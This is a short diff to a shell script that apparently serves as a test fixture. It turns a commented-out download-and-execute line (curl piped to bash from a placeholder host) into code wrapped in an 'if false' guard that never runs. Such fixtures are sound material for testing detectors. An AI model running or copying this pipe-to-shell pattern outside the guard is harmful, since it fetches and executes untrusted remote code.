@@ -1,4 +1,5 @@
 #!/bin/sh
-# INTENTIONALLY UNSAFE EXAMPLE — DO NOT EXECUTE.
-# This inert comment demonstrates a download-and-execute pattern:
-# curl https://example.invalid/install.sh | bash
+# INTENTIONALLY UNSAFE TEST FIXTURE — do not remove the false guard.
+if false; then
+  curl https://example.invalid/install.sh | bash
+fi
